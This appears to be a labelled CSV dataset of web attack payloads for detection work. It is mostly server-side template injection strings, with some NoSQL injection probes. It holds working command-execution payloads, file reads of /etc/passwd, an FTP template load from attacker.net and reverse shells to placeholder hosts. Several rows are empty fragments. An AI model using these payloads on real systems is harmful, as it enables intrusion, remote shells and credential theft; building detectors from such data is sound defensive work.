"${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self._TemplateReference__context.cycler.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self._TemplateReference__context.joiner.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self._TemplateReference__context.namespace.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{cycler.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{joiner.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{namespace.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{#with ""s"" as |string|}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{#with ""e""}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{#with split as |conslist|}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this.pop}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{this.push (lookup string.sub ""constructor"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this.pop}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{#with string.split as |codelist|}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this.pop}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this.pop}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{#each conslist}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{#with (string.sub.apply 0 codelist)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/each}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"string = ""{{= username}}""",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{= _.VERSION}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${= _.VERSION},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{= _.templateSettings.evaluate }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${= _.VERSION},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{= }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{= }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*'7'}} would result in 49,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{dump(_context)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$output = $twig > render (,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$output = $twig > render (,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{include(""wp-config.php"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{_self.env.setCache(""ftp://attacker.net:2121"")}}{{_self.env.loadTemplate(""backdoor"")}}",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|map('system')|join}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|filter('passthru')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|map('passthru')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['nslookup oastify.com']|filter('system')}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{""""username"""": {""""$eq"""": """"admin""""}"," """"password"""": {""""$regex"""": """"^m"""" }}""",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^md"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^mdp"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"${'patt'.toString().replace('a', 'x')}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${dwf.newInstance(ec,null)(""id"")}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${pageContext.request.getSession().setAttribute(""admin"",true)}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{['id',1]|sort('system')|join}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{[0]|reduce('system','id')}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{a.stdio=[w,w]}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{app.request.server.all|join(',')}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{[0]|reduce('system','id')}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${pageContext.request.getSession().setAttribute(""admin"",true)}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{a.stdio=[w,w]}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^m"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"${dwf.newInstance(ec,null)(""id"")}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"${'patt'.toString().replace('a', 'x')}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^md"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
"{{app.request.server.all|join(',')}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{{['id',1]|sort('system')|join}}",SSTI,Server Side Template Injection,High,T1090,Malicious,Server Side Template Injection attack attempt
"{""username"": {""$eq"": ""admin""}, ""password"": {""$regex"": ""^mdp"" }}",SSTI,NoSQL Injection,Critical,T1190,Malicious,NoSQL Injection attack attempt
%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B3%2A3%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B3%2A%273%27%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%3C%25%3D%203%20%2A%203%20%25%3E%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7B6%2A6%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7B%7B3%2A3%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%40%286%2B5%29%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%23%7B3%2A3%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%23%7B%203%20%2A%203%20%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bdump%28app%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bconfig.items%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D,SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%20request%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bself%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%24smarty.version%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest.__class__%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,High,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A,SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.